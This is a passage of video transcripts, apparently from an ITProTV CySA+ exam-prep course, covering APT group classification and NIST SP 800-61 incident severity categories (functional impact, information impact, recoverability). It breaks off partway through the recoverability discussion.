they've\ngot their hands full.\n\n488\n00:25:16.665 --> 00:25:22.082\nAPT34, they suspected that it's Iran,\nan Iranian group, maybe the government.\n\n489\n00:25:22.082 --> 00:25:27.840\n[LAUGH] To be honest with you,\nnation states do employ APT.\n\n490\n00:25:27.840 --> 00:25:30.030\nSo they very well could be that.\n\n491\n00:25:30.030 --> 00:25:33.190\nAnd who they are after overview of them.\n\n492\n00:25:33.190 --> 00:25:35.583\nVery interesting stuff that we've\ngot quite a few of them in here.\n\n493\n00:25:35.583 --> 00:25:36.790\nAnother Iranian one.\n\n494\n00:25:36.790 --> 00:25:38.720\nThis one from Vietnam.\n\n495\n00:25:38.720 --> 00:25:40.360\nI think China has a few as well there,\nAPT30.\n\n496\n00:25:40.360 --> 00:25:43.527\nAnd you just go through them,\nread about them and\n\n497\n00:25:43.527 --> 00:25:48.007\nwill help you learn a bit more about\nAPT threats and groups as a whole so\n\n498\n00:25:48.007 --> 00:25:52.315\nthat you can better understand them and\nbe ready for that exam.\n\n499\n00:25:52.315 --> 00:25:56.111\nBut Mike, I think that's the basic idea\nof these different classifications,\n\n500\n00:25:56.111 --> 00:25:59.738\nwe're not really trying to get into\nthe nuts and bolts of them other than just\n\n501\n00:25:59.738 --> 00:26:02.930\ndefine them, classify them,\nput them in their proper category.\n\n502\n00:26:02.930 --> 00:26:03.780\n&gt;&gt; All right Daniel,\n\n503\n00:26:03.780 --> 00:26:06.817\na great way to take those definitions and\nmake them exciting for us.\n\n504\n00:26:06.817 --> 00:26:08.660\n&gt;&gt; I try. [LAUGH] &gt;&gt; So\nwe appreciate that.\n\n505\n00:26:08.660 --> 00:26:10.383\nHope everybody out there\nenjoyed watching this one.\n\n506\n00:26:10.383 --> 00:26:13.470\nSigning off for ITProTV,\nI've been your host Mike Rodrick.\n\n507\n00:26:13.470 --> 00:26:19.670\n&gt;&gt; And I'm Daniel Lowrie.\n&gt;&gt; And we'll see you next time.\n\n508\n00:26:19.670 --> 00:26:21.524\n[MUSIC]\n\n509\n00:26:21.524 --> 00:26:24.930\nThank you for watching, ITPRO.TV.\n\n",

Hello,\n\n6\n00:00:12.788 --> 00:00:15.683\nwelcome to another exciting episode,\nhere at ITPROTV.\n\n7\n00:00:15.683 --> 00:00:17.280\nI'm your host Mike Rodrick.\n\n8\n00:00:17.280 --> 00:00:20.110\nToday, we're doing our CySA+.\n\n9\n00:00:20.110 --> 00:00:24.350\nIn this episode, we'll be talking\nabout severity and prioritization.\n\n10\n00:00:24.350 --> 00:00:28.000\nWe took a look at classifying threats and\nso our next step.\n\n11\n00:00:28.000 --> 00:00:31.280\nHere to guide us through that is\nnone other than Mr. Daniel Lowrie.\n\n12\n00:00:31.280 --> 00:00:33.230\nWelcome back Daniel.\n&gt;&gt; Mike, thanks for having me in again.\n\n13\n00:00:33.230 --> 00:00:37.240\nAlways a pleasure to be on stage with my\nmain man over here cuz I know he shares\n\n14\n00:00:37.240 --> 00:00:40.770\nthe lust for the security stuff.\n&gt;&gt; I do.\n\n15\n00:00:40.770 --> 00:00:42.510\n&gt;&gt; So, it's always fun to have Mikey's\n\n16\n00:00:42.510 --> 00:00:46.270\nopinions and perspectives,\nalong with my own and as well as yours,\n\n17\n00:00:46.270 --> 00:00:49.320\nyou're always free to jump in\nthat chatroom anytime you like.\n\n18\n00:00:49.320 --> 00:00:50.770\nJoin us in the conversation.\n\n19\n00:00:50.770 --> 00:00:54.440\nThat being said, today's conversation is,\njust what Mike said, which is severity and\n\n20\n00:00:54.440 --> 00:00:55.720\nprioritization.\n\n21\n00:00:55.720 --> 00:00:58.750\nNow that we have our threats categorized.\n\n22\n00:00:58.750 --> 00:01:03.870\nHow do I categorize [COUGH]\nhow bad this would be,\n\n23\n00:01:03.870 --> 00:01:07.450\nIf it were to occur,\nif something were to happen?\n\n24\n00:01:07.450 --> 00:01:08.890\nAnd that can be a difficult prospect.\n\n25\n00:01:08.890 --> 00:01:11.121\nSo, that's what we're going to look at,\nand\n\n26\n00:01:11.121 --> 00:01:16.220\nthen prioritizing what do I, Attack first,\nwhat do I start handling first?\n\n27\n00:01:16.220 --> 00:01:17.520\nWhat do I do first?\n\n28\n00:01:17.520 --> 00:01:18.290\nThat kind of idea.\n\n29\n00:01:18.290 --> 00:01:20.630\nSo that's what today\nis gonna be all about.\n\n30\n00:01:20.630 --> 00:01:21.190\n&gt;&gt; Difficult for\n\n31\n00:01:21.190 --> 00:01:22.360\na security personnel, right?\n\n32\n00:01:22.360 --> 00:01:24.945\nThere's a lot of threats\nthat you have to deal with.\n\n33\n00:01:24.945 --> 00:01:29.965\nSome of them worse than others, and\nyou can't handle them all at once.\n\n34\n00:01:29.965 --> 00:01:33.400\nSo you do have to have some way to\nsay Mike, we're gonna start here and\n\n35\n00:01:33.400 --> 00:01:35.165\nwork our way through.\n&gt;&gt; That's right.\n\n36\n00:01:35.165 --> 00:01:39.185\nAnd the way we're gonna start this\nis start looking at what CompTIA has\n\n37\n00:01:39.185 --> 00:01:39.997\nlaid out for us.\n\n38\n00:01:39.997 --> 00:01:43.405\nWe're gonna follow their guidelines and\nspecifications very, very closely,\n\n39\n00:01:43.405 --> 00:01:47.255\nif not exactly so\nthat you people are prepared for the exam.\n\n40\n00:01:47.255 --> 00:01:52.365\nThat's exactly what I want, and then any\nother tertiary information that Mike and\n\n41\n00:01:52.365 --> 00:01:54.450\nI can think of,\nwe'll throw at you as well.\n\n42\n00:01:54.450 --> 00:01:58.120\nSo let's go with,\nI'll start with the scope of impact.\n\n43\n00:01:58.120 --> 00:02:00.590\nWhat does this hit?\n\n44\n00:02:00.590 --> 00:02:05.420\nIf I've got this vulnerability,\nI've got a threat, what does it affect?\n\n45\n00:02:05.420 --> 00:02:07.450\nAnd from where to where?\n\n46\n00:02:07.450 --> 00:02:09.405\nThat's the scope of the impact, okay?\n\n47\n00:02:09.405 --> 00:02:13.870\n[COUGH] There's different ways\nin which this can happen.\n\n48\n00:02:13.870 --> 00:02:16.480\nWe're just gonna work our way\nthrough the objectives and\n\n49\n00:02:16.480 --> 00:02:20.490\nhit all of the main bullet points so\nthat you're ready for that.\n\n50\n00:02:20.490 --> 00:02:25.130\nFirst one will be the system\nprocess criticality and\n\n51\n00:02:25.130 --> 00:02:27.390\nbasically the functional impacts.\n\n52\n00:02:27.390 --> 00:02:28.390\nWhat happens?\n\n53\n00:02:28.390 --> 00:02:33.820\nDo I lose access to my server,\nor is it just impaired?\n\n54\n00:02:33.820 --> 00:02:34.579\nWhat's going on?\n\n55\n00:02:34.579 --> 00:02:36.715\nWe need to be able to classify that.\n\n56\n00:02:36.715 --> 00:02:43.354\nThe cool thing is again, leaning heavily\non standards that are out there for us.\n\n57\n00:02:43.354 --> 00:02:46.040\nNIST is one of them that they've gone to.\n\n58\n00:02:46.040 --> 00:02:49.619\nThey have a document called the SP800-61,\nand\n\n59\n00:02:49.619 --> 00:02:54.390\na lot of the information that comes\nfrom this section of the exam is taken\n\n60\n00:02:54.390 --> 00:02:57.680\ndirectly out of their\nrecommendation guide.\n\n61\n00:02:57.680 --> 00:03:00.255\nSo you can go freely access that.\n\n62\n00:03:00.255 --> 00:03:03.860\nI'll have a link to it in the show\nnotes so that you can read it.\n\n63\n00:03:03.860 --> 00:03:06.100\nIt's not that bad of a document to read.\n\n64\n00:03:06.100 --> 00:03:09.140\nIt might take you, depending on how\nfast or slow of a reader you are.\n\n65\n00:03:09.140 --> 00:03:11.870\nI'm a slow reader, so it took me\na couple days to get through it and\n\n66\n00:03:11.870 --> 00:03:15.210\nreally understand what's going on.\n\n67\n00:03:15.210 --> 00:03:16.655\nIf i can do it, you can do it.\n\n68\n00:03:16.655 --> 00:03:20.335\nLet's put it that way cuz reading\nthose dry type of diagram,\n\n69\n00:03:20.335 --> 00:03:23.780\nit is a little drier because\nit's very technical.\n\n70\n00:03:23.780 --> 00:03:27.980\nBut it is the information you need for\nthese types of situations.\n\n71\n00:03:27.980 --> 00:03:33.355\nAll right, so functional impact,\nlet's go to that document, look at that.\n\n72\n00:03:33.355 --> 00:03:39.544\nI'm right here, I'm in Incident\nPrioritization section of it, 3.2.6.\n\n73\n00:03:39.544 --> 00:03:41.185\nZoom in a little bit here, [COUGH] and\n\n74\n00:03:41.185 --> 00:03:45.019\nstarts talking about the function impact\nof the incident, information impact and\n\n75\n00:03:45.019 --> 00:03:47.500\nrecoverability, we're\ngonna cover these as well.\n\n76\n00:03:48.820 --> 00:03:52.220\nBut what I want you guys\nto see is these quick and\n\n77\n00:03:52.220 --> 00:03:53.680\ndirty little definitional charts.\n\n78\n00:03:53.680 --> 00:03:54.590\nI love these things.\n\n79\n00:03:54.590 --> 00:03:58.590\nThese are worth their weight in gold for\nyou, as far as the exam goes.\n\n80\n00:03:58.590 --> 00:04:03.292\nSo I wanted to specifically point them\nout so that you know where they're at.\n\n81\n00:04:03.292 --> 00:04:06.310\nAll right, so\nthis is the functional impact categories.\n\n82\n00:04:06.310 --> 00:04:08.610\nSo you've got your category\nover here on your left side.\n\n83\n00:04:08.610 --> 00:04:10.100\nAnd you got your definition for\n\n84\n00:04:10.100 --> 00:04:13.030\neach of those categories on the right\nside, very straightforward.\n\n85\n00:04:13.030 --> 00:04:18.160\nSo category none, there is no effect\nto the organization's ability\n\n86\n00:04:18.160 --> 00:04:20.820\nto provide all services to all users.\n\n87\n00:04:20.820 --> 00:04:22.981\nVery good, so\nwhat is the functional impact?\n\n88\n00:04:22.981 --> 00:04:24.288\nNone, it didn't do anything to me.\n\n89\n00:04:24.288 --> 00:04:27.063\nYes we were attacked,\nor there was a threat,\n\n90\n00:04:27.063 --> 00:04:31.227\nthere was a whatever the case is,\nand an incident has occurred, but\n\n91\n00:04:31.227 --> 00:04:35.845\neven though that incident occurred,\nfunctionally, we saw no downtime.\n\n92\n00:04:35.845 --> 00:04:38.999\n[COUGH] All my services, all my processes,\n\n93\n00:04:38.999 --> 00:04:43.380\nall my applications were still\navailable to all my users and\n\n94\n00:04:43.380 --> 00:04:49.520\nthey saw no degradation in their user\nexperience when working with them.\n\n95\n00:04:49.520 --> 00:04:53.690\nThat is the none idea\nof functional impacts.\n\n96\n00:04:53.690 --> 00:04:54.620\n&gt;&gt; We like that one.\n\n97\n00:04:54.620 --> 00:04:55.408\n&gt;&gt; We do like that.\n\n98\n00:04:55.408 --> 00:04:55.984\n&gt;&gt; [LAUGH]\n\n99\n00:04:55.984 --> 00:04:57.232\n&gt;&gt; But that doesn't mean that something\n\n100\n00:04:57.232 --> 00:04:58.130\nbad didn't happen.\n&gt;&gt; Right.\n\n101\n00:04:58.130 --> 00:05:00.027\n&gt;&gt; Just because everybody was still able\n\n102\n00:05:00.027 --> 00:05:01.870\nto get to your website and buy stuff.\n\n103\n00:05:01.870 --> 00:05:04.094\nIt may have been that\nthey exfiltrated all your\n\n104\n00:05:04.094 --> 00:05:04.900\ncustomers out.\n\n105\n00:05:04.900 --> 00:05:05.607\n&gt;&gt; Right.\n&gt;&gt; Right?\n\n106\n00:05:05.607 --> 00:05:08.523\nThat didn't stop you from selling things,\nright?\n\n107\n00:05:08.523 --> 00:05:09.358\nSee what I mean?\n\n108\n00:05:09.358 --> 00:05:12.322\nSo just because the functional impact\nmight be none or low or medium or\n\n109\n00:05:12.322 --> 00:05:14.940\nwhatever doesn't mean that\nsomething bad didn't happen.\n\n110\n00:05:14.940 --> 00:05:17.810\nSo just keep that in mind as we work\nthrough these different definitions and\n\n111\n00:05:17.810 --> 00:05:19.670\ncategories, all right?\n\n112\n00:05:19.670 --> 00:05:22.590\n[COUGH] All right,\nlet's go to low, minimal effects.\n\n113\n00:05:22.590 --> 00:05:26.450\nThe organization can still provide all\ncritical services to all users, but\n\n114\n00:05:26.450 --> 00:05:28.370\nhas lost efficiency.\n\n115\n00:05:28.370 --> 00:05:32.890\nSo now we're starting to see some impact\nto the functionality of the system itself.\n\n116\n00:05:32.890 --> 00:05:34.560\nUsers are calling and complaining.\n\n117\n00:05:34.560 --> 00:05:39.280\nIt's a little slow today,\nand is it my computer?\n\n118\n00:05:39.280 --> 00:05:40.150\nIs it this site?\n\n119\n00:05:40.150 --> 00:05:40.650\nIs it this?\n\n120\n00:05:40.650 --> 00:05:41.160\nIs it that?\n\n121\n00:05:41.160 --> 00:05:44.430\nIs it the service I'm trying to get\nahold of that's causing the problem?\n\n122\n00:05:44.430 --> 00:05:45.880\nWhat is the issue?\n\n123\n00:05:45.880 --> 00:05:49.300\nAnd if we've determined that,\nyes, there was an incident and\n\n124\n00:05:49.300 --> 00:05:53.830\nthe incident is directly impacting\nperformance of said service or\n\n125\n00:05:53.830 --> 00:05:58.170\napplication or in some way to that,\na server itself.\n\n126\n00:05:59.330 --> 00:06:00.350\nWhat is the level of that?\n\n127\n00:06:00.350 --> 00:06:03.800\nNow, of course,\nthis is all kind of subjective.\n\n128\n00:06:03.800 --> 00:06:07.900\nWhen you say the words like, minimal\neffect, well, what is minimal effect?\n\n129\n00:06:07.900 --> 00:06:10.570\nAll right, that's how you would define it.\n\n130\n00:06:10.570 --> 00:06:12.120\nAnd as an organization,\n\n131\n00:06:12.120 --> 00:06:16.600\nyou would get together and\nmore thoroughly define those things.\n\n132\n00:06:16.600 --> 00:06:17.540\nBut again, they're subjective.\n\n133\n00:06:17.540 --> 00:06:22.798\nThe exam isn't gonna be able to say this\nis the defined as a minimal effect for\n\n134\n00:06:22.798 --> 00:06:23.630\neveryone.\n\n135\n00:06:23.630 --> 00:06:26.853\nThat would be too difficult, too broad\nof a scope for them to handle, so\n\n136\n00:06:26.853 --> 00:06:28.109\nthey don't try to do that.\n\n137\n00:06:28.109 --> 00:06:33.244\nYou just need to know it has some effect,\nbut not much, okay?\n\n138\n00:06:33.244 --> 00:06:37.062\n[COUGH] Medium,\norganization has lost the ability to\n\n139\n00:06:37.062 --> 00:06:41.490\nprovide a critical service\nto a subset of system users.\n\n140\n00:06:41.490 --> 00:06:45.770\nSo a critical service has been\nimpacted by the incident, but\n\n141\n00:06:45.770 --> 00:06:49.870\nonly certain users are feeling\nthat impact, right?\n\n142\n00:06:49.870 --> 00:06:55.340\nOnly certain subset of your\nentirety of your user base is\n\n143\n00:06:55.340 --> 00:06:59.660\nfeeling the fact that well,\nI'm unable to get to x, y, or z service or\n\n144\n00:06:59.660 --> 00:07:03.680\nserver or application, it's not working.\n\n145\n00:07:03.680 --> 00:07:06.510\nI can access it, but\nit doesn't work hardly at all,\n\n146\n00:07:06.510 --> 00:07:08.630\nsomething like that would be\nwhat you're talking about.\n\n147\n00:07:09.630 --> 00:07:13.280\nAnd then, of course, high, organization is\nno longer able to provide some critical\n\n148\n00:07:13.280 --> 00:07:16.540\nservices to any users, right?\n\n149\n00:07:16.540 --> 00:07:21.100\nNot all critical services, notice is says\nthat, and it says some critical services.\n\n150\n00:07:21.100 --> 00:07:25.120\nSo the impact of an incident\ndirectly affected the functional\n\n151\n00:07:25.120 --> 00:07:29.890\naspect of some critical\nservices to all users, right?\n\n152\n00:07:29.890 --> 00:07:33.580\nAgain, this would be a great time for\nyou to grab those flash cards or\n\n153\n00:07:33.580 --> 00:07:36.830\njust download this PDF and\nstart the memorization process because\n\n154\n00:07:36.830 --> 00:07:39.020\nthat's what you're gonna need to know for\nthe exam.\n\n155\n00:07:40.090 --> 00:07:42.080\nAll right, so let's move on,\n\n156\n00:07:42.080 --> 00:07:46.640\nlet's go into the information impact,\ncuz it's the next one.\n\n157\n00:07:46.640 --> 00:07:48.611\nWhy the heck not, right?\n\n158\n00:07:48.611 --> 00:07:54.280\n[COUGH] This is kinda the data integrity\nportion of our proceedings here.\n\n159\n00:07:54.280 --> 00:07:56.122\nWhat happened to our data?\n\n160\n00:07:56.122 --> 00:08:01.530\nAnything impact that's integrity\nof it in any way, shape or form?\n\n161\n00:08:01.530 --> 00:08:05.291\nSo let's take a look here, we've got\nthe categorization of none, which again,\n\n162\n00:08:05.291 --> 00:08:06.558\nwe all love so much.\n&gt;&gt; [LAUGH]\n\n163\n00:08:06.558 --> 00:08:08.119\n&gt;&gt; That's what we want to\n\n164\n00:08:08.119 --> 00:08:11.487\nbe able to categorize any incident as,\nas none,\n\n165\n00:08:11.487 --> 00:08:16.020\nas far as its impact to our\nfunctionality or our integrity so far.\n\n166\n00:08:17.430 --> 00:08:20.280\nSays no information was exfiltrated,\nchanged, deleted,\n\n167\n00:08:20.280 --> 00:08:22.460\nor otherwise compromised.\n\n168\n00:08:22.460 --> 00:08:27.520\nSo basically even though someone was\nable to perform some sort of incident.\n\n169\n00:08:27.520 --> 00:08:30.440\nSome attack occurred and\nit was in some ways successful.\n\n170\n00:08:30.440 --> 00:08:31.670\nThere was an incident.\n\n171\n00:08:31.670 --> 00:08:34.448\nOr even if it wasn't successful,\nit's still an incident,\n\n172\n00:08:34.448 --> 00:08:35.707\nif somebody attacked you.\n\n173\n00:08:35.707 --> 00:08:39.085\nEven if you came away unscathed,\nit's still an incident, okay?\n\n174\n00:08:39.085 --> 00:08:41.100\nBut nothing happened.\n\n175\n00:08:41.100 --> 00:08:42.420\nAgain, you came away unscathed.\n\n176\n00:08:42.420 --> 00:08:46.360\nNo data, as far as the data integrity\nis concerned, nothing occurred,\n\n177\n00:08:46.360 --> 00:08:47.950\neverything is as it should be.\n\n178\n00:08:49.120 --> 00:08:50.820\nAnd the grass is green,\nthe sky is blue and\n\n179\n00:08:50.820 --> 00:08:52.540\nthe birds are singing,\nright, that's what we like.\n\n180\n00:08:53.690 --> 00:08:57.000\nNow let's look at the category\nof privacy breach.\n\n181\n00:08:57.000 --> 00:09:01.981\nSensitive, personally identifiable\ninformation of taxpayers,\n\n182\n00:09:01.981 --> 00:09:06.980\nemployees, beneficiaries, etc,\nwas accessed or exfiltrated.\n\n183\n00:09:06.980 --> 00:09:09.030\nSo this is where bad things\nare starting to occur.\n\n184\n00:09:09.030 --> 00:09:12.700\nWe're gonna talk a little more pie here\nin just a minute after we get through\n\n185\n00:09:12.700 --> 00:09:13.800\nthis section.\n\n186\n00:09:13.800 --> 00:09:17.286\nBut somebody was able to access something.\n\n187\n00:09:17.286 --> 00:09:20.407\nAnd it was sensitive data, right?\n\n188\n00:09:20.407 --> 00:09:23.350\nSo the integrity of that\ndata is now under question.\n\n189\n00:09:23.350 --> 00:09:29.750\nIt might not have been everything or that,\nbut it was under the privacy area thing.\n\n190\n00:09:29.750 --> 00:09:32.580\nSo that's why it's under there,\nthey define it as personally\n\n191\n00:09:32.580 --> 00:09:36.430\nidentifiable information there\nbecause that's private information.\n\n192\n00:09:36.430 --> 00:09:42.090\nThis is the kind of data breach\nthat you go no, man, we're Equifax.\n\n193\n00:09:42.090 --> 00:09:45.012\nWe're pulling an Equifax here and\neverybody's gonna hate us.\n\n194\n00:09:45.012 --> 00:09:46.608\nWe're Target, you know?\n\n195\n00:09:46.608 --> 00:09:48.940\n[LAUGH] Not good news, right?\n\n196\n00:09:48.940 --> 00:09:50.350\nThis is bad news for you.\n\n197\n00:09:50.350 --> 00:09:52.570\nAnd typically, people will just slap you\non the hand and say, don't do that again.\n\n198\n00:09:52.570 --> 00:09:54.764\nYou come out, you promise?\nLike Mike showed us the deal we got.\n\n199\n00:09:54.764 --> 00:09:58.459\n[LAUGH] We swear that will\nnever happen again, but\n\n200\n00:09:58.459 --> 00:10:00.952\nit's still usually-\n&gt;&gt; Until the next time.\n\n201\n00:10:00.952 --> 00:10:01.944\n&gt;&gt; Yeah, until the next time.\n\n202\n00:10:01.944 --> 00:10:07.102\n[LAUGH] All right, proprietary breech,\nunclassified proprietary information,\n\n203\n00:10:07.102 --> 00:10:12.640\nsuch as protective critical infrastructure\ninformation was accessed or exfiltrated.\n\n204\n00:10:13.950 --> 00:10:19.393\nSo this is information that is specific\nto your company and its on-goings.\n\n205\n00:10:19.393 --> 00:10:24.311\nI try to think of things\nlike financial information,\n\n206\n00:10:24.311 --> 00:10:27.690\neven though that might not be it.\n&gt;&gt; Internal\n\n207\n00:10:27.690 --> 00:10:28.390\nprocess-\n&gt;&gt; Yeah,\n\n208\n00:10:28.390 --> 00:10:29.600\n&gt;&gt; The Coke formula.\n\n209\n00:10:29.600 --> 00:10:31.440\n&gt;&gt; Yeah, I like that, Coke formula,\n\n210\n00:10:31.440 --> 00:10:32.590\nperfect one, right.\n\n211\n00:10:32.590 --> 00:10:37.480\nHow do you make Coke, what's the 11\nherbs and spices inside of KFC, right?\n\n212\n00:10:37.480 --> 00:10:41.392\nThat's the stuff that will be\nunder our proprietary breach.\n\n213\n00:10:41.392 --> 00:10:43.375\nA great call on that, Mike.\n&gt;&gt; Mm-hm.\n\n214\n00:10:43.375 --> 00:10:45.542\n&gt;&gt; All right, and then integrity loss,\n\n215\n00:10:45.542 --> 00:10:50.670\nwell, this is sensitive or proprietary\ninformation was changed or deleted.\n\n216\n00:10:50.670 --> 00:10:55.120\nAll right, so it wasn't exfiltrated,\nthis was just wiped out.\n\n217\n00:10:55.120 --> 00:10:58.320\nWell, maybe it was exfiltrated,\nbut you don't have it any more.\n\n218\n00:10:58.320 --> 00:11:02.770\nIt's gone, as far as you're\nconcerned as a organization.\n\n219\n00:11:02.770 --> 00:11:04.550\nIt was once your data and man,\n\n220\n00:11:04.550 --> 00:11:06.860\nit'd be nice to have that back.\n&gt;&gt; [LAUGH]\n\n221\n00:11:06.860 --> 00:11:08.870\n&gt;&gt; But it ain't here no more.\n\n222\n00:11:08.870 --> 00:11:13.460\nSo let's hope you're doing your\nback ups and replication and\n\n223\n00:11:13.460 --> 00:11:18.540\nall the other ways in which you can,\nthat whole BCDR concept.\n\n224\n00:11:18.540 --> 00:11:21.010\nWhat happens if the worst occurs?\n\n225\n00:11:21.010 --> 00:11:22.659\nHow do we recover from that?\n\n226\n00:11:22.659 --> 00:11:26.903\nI assume at that point you're gonna\nwant get in to that business,\n\n227\n00:11:26.903 --> 00:11:31.223\ncuz if you've lost sensitive or\nproprietary information at all,\n\n228\n00:11:31.223 --> 00:11:34.635\nit was either changed in\naway that makes it not work.\n\n229\n00:11:34.635 --> 00:11:39.468\nSo let's say we had that formula for\nCoke, we go into to the system that puts\n\n230\n00:11:39.468 --> 00:11:44.840\nthose ingredients together, a threat\nactor does, and changes it in some way.\n\n231\n00:11:44.840 --> 00:11:46.930\nAnd now you don't have Coke,\nyou've got cyanide.\n\n232\n00:11:46.930 --> 00:11:48.530\nThat'd be bad, right?\n\n233\n00:11:48.530 --> 00:11:51.960\nSo that would be an unfortunate event.\n\n234\n00:11:51.960 --> 00:11:54.546\nOr even if it just made it\ntaste like earwax or something.\n\n235\n00:11:54.546 --> 00:11:55.980\nYou know, people are gonna buy it and\n\n236\n00:11:55.980 --> 00:11:59.820\ngo, I love my Coke on a hot summer,\nthis is horrible.\n\n237\n00:11:59.820 --> 00:12:04.559\nAnd you have a bad end user experience and\nthey don't want to buy Coke anymore.\n\n238\n00:12:04.559 --> 00:12:10.665\nSo this is why even if it is changed\nin some way, that's an integrity loss.\n\n239\n00:12:10.665 --> 00:12:12.746\nAnd if it's deleted, of course,\nnow you've lost the formula and\n\n240\n00:12:12.746 --> 00:12:14.850\nyou don't know how to make Coke anymore.\n\n241\n00:12:14.850 --> 00:12:17.530\nYou're out of business, you know, so\nthese things you gotta keep under\n\n242\n00:12:17.530 --> 00:12:20.060\nlock and key.\n&gt;&gt; And I do like, Daniel, what they put up\n\n243\n00:12:20.060 --> 00:12:23.830\nthere about how, except for none,\nthese are not mutually exclusive.\n\n244\n00:12:23.830 --> 00:12:28.698\nYou might have an incident that\nincludes a privacy breach, and-\n\n245\n00:12:28.698 --> 00:12:29.929\n&gt;&gt; And.\n\n246\n00:12:29.929 --> 00:12:30.844\n&gt;&gt; And, what's the other one,\n\n247\n00:12:30.844 --> 00:12:31.968\nproprietary breach,\n&gt;&gt; Right.\n\n248\n00:12:31.968 --> 00:12:33.504\n&gt;&gt; Or some combination of.\n\n249\n00:12:33.504 --> 00:12:34.976\nAnd it's not that one is\nworse than the other.\n\n250\n00:12:34.976 --> 00:12:36.407\nThis isn't a scale-\n&gt;&gt; It's just different.\n\n251\n00:12:36.407 --> 00:12:37.019\n&gt;&gt; Of none to\n\n252\n00:12:37.019 --> 00:12:38.287\nintegrity.\n&gt;&gt; Right.\n\n253\n00:12:38.287 --> 00:12:39.251\n&gt;&gt; Each one of these could\n\n254\n00:12:39.251 --> 00:12:40.840\nbe equally as bad.\n&gt;&gt; Right.\n\n255\n00:12:40.840 --> 00:12:43.060\nSo we gotta keep that in our minds.\n\n256\n00:12:43.060 --> 00:12:45.170\nMike pulling out really good points here.\n\n257\n00:12:45.170 --> 00:12:46.660\nThey're not mutually exclusive.\n\n258\n00:12:46.660 --> 00:12:47.510\nIt might be both.\n\n259\n00:12:47.510 --> 00:12:50.360\nIt might be some, but you have to be\nable to categorize them correctly\n\n260\n00:12:50.360 --> 00:12:52.700\nsince you know what it was, okay?\n\n261\n00:12:52.700 --> 00:12:56.320\nSo let's move on, recoverability efforts.\n\n262\n00:12:56.320 --> 00:12:57.980\nThis is a fun one.\n\n263\n00:12:57.980 --> 00:13:01.286\nSo we've got regular, supplemented,\nextended and non-recoverable.\n\n264\n00:13:01.286 --> 00:13:03.559\nGuess which one's the worst?\n&gt;&gt; [LAUGH]\n\n265\n00:13:03.559 --> 00:13:05.050\n&gt;&gt; Don't answer now.\n\n266\n00:13:05.050 --> 00:13:07.580\nJust keep it down [LAUGH].\n\n267\n00:13:07.580 --> 00:13:12.040\nSo regular, time to recovery is\npredictable with existing resources.\n\n268\n00:13:12.040 --> 00:13:17.880\nWe've had a data breach,\nwe've had an incident of some type and we\n\n269\n00:13:17.880 --> 00:13:23.150\nnow need to get back, this is the business\ncontinuity and disaster recovery idea.\n\n270\n00:13:23.150 --> 00:13:25.360\nHow do we get back to\njust normal business?\n\n271\n00:13:25.360 --> 00:13:30.200\nWell, the time to it is gonna be again,\na subjective thing.\n\n272\n00:13:30.200 --> 00:13:35.040\nIt's very minimal and\nit wouldn't be outside of the scope\n\n273\n00:13:35.040 --> 00:13:38.950\nof any other maybe,\nregular incident that happened.\n\n274\n00:13:38.950 --> 00:13:42.299\nMaybe it wasn't an attack, per se but,\nI've accidentally shut down the,\n\n275\n00:13:42.299 --> 00:13:43.129\nwhich I've done.\n\n276\n00:13:43.129 --> 00:13:43.984\nAn email server.\n&gt;&gt; [LAUGH]\n\n277\n00:13:43.984 --> 00:13:44.725\n&gt;&gt; How long does it take to\n\n278\n00:13:44.725 --> 00:13:45.670\nrecover from that?\n\n279\n00:13:45.670 --> 00:13:48.580\nA reboot,\nhowever long a reboot time is, right?\n\n280\n00:13:48.580 --> 00:13:49.570\nSo that could be it.\n\n281\n00:13:49.570 --> 00:13:50.900\nThat would be under regular.\n\n282\n00:13:50.900 --> 00:13:51.460\nThat kind of thing.\n\n283\n00:13:52.740 --> 00:13:55.220\nAnd, like I said, it's predictable.\n\n284\n00:13:55.220 --> 00:13:57.010\nI kind of know how long that takes.\n\n285\n00:13:57.010 --> 00:13:59.200\nIt takes five minutes for\nthe server to get back up and running.\n\n286\n00:13:59.200 --> 00:14:02.550\nThe entire incident itself would\nbe maybe 15 minutes in total,\n\n287\n00:14:02.550 --> 00:14:05.280\nbefore people saw that\neverything was back to normal.\n\n288\n00:14:05.280 --> 00:14:06.600\nMaybe your website was defaced,\n\n289\n00:14:06.600 --> 00:14:09.520\nand all you have to do is\nreplace it with a backup.\n\n290\n00:14:09.520 --> 00:14:13.106\nAnd I know how long that takes me two\nseconds to get into the back-up system.\n\n291\n00:14:13.106 --> 00:14:14.140\n&gt;&gt; Back-ups are on site,\n\n292\n00:14:14.140 --> 00:14:16.720\nwe got them right here.\n&gt;&gt; Right, copy, copy the file over,\n\n293\n00:14:16.720 --> 00:14:17.820\nand there you go.\n\n294\n00:14:17.820 --> 00:14:19.770\nI can predict how long that takes.\n\n295\n00:14:19.770 --> 00:14:22.030\nAnd it's done with existing resources.\n\n296\n00:14:22.030 --> 00:14:24.710\nI don't have to go out, I don't have\nto buy a new piece of equipment.\n\n297\n00:14:24.710 --> 00:14:29.670\nI don't have to hire someone that's\na specialist to come in and do anything.\n\n298\n00:14:29.670 --> 00:14:34.400\nI have the resources at hand, I can\nmake it happen, therefore it is regular.\n\n299\n00:14:35.460 --> 00:14:39.580\nAll right, supplemented,\ntime to recovery is still predictable, but\n\n300\n00:14:39.580 --> 00:14:41.300\nnow we need those additional resources.\n\n301\n00:14:41.300 --> 00:14:44.100\nNow I need to buy that\nspecialized piece of equipment.\n\n302\n00:14:44.100 --> 00:14:47.140\nI need to hire that specialist,\nI get Mike to come in.\n\n303\n00:14:47.140 --> 00:14:50.110\nHe's the Microsoft back-up guru,\nhe knows that stuff.\n\n304\n00:14:50.110 --> 00:14:53.302\nI need him,\nwe don't have that specialty in-house.\n\n305\n00:14:53.302 --> 00:14:57.680\nI'm gonna have to pay him money,\nso there's monetary outputs\n\n306\n00:14:57.680 --> 00:15:02.620\nto this type of category as well,\nso just keep that in mind.\n\n307\n00:15:02.620 --> 00:15:05.890\nExtended time to recovery\nis unpredictable.\n\n308\n00:15:05.890 --> 00:15:09.230\nNow it's starting to get\nbad [LAUGH] because you\n\n309\n00:15:09.230 --> 00:15:13.070\nknow the villagers are at the door with\ntheir pitchforks and their torches.\n\n310\n00:15:13.070 --> 00:15:16.680\nAnd they're like, when do I get back\nto the, my regular line of business,\n\n311\n00:15:16.680 --> 00:15:18.310\nI need to be able to access my resource.\n\n312\n00:15:18.310 --> 00:15:21.992\nWhen is that gonna happen and you're\nlike [NOISE] that's a great question.\n\n313\n00:15:21.992 --> 00:15:25.951\nAnd I'm gonna go with, is that Elvis?\n&gt;&gt; [LAUGH]\n\n314\n00:15:25.951 --> 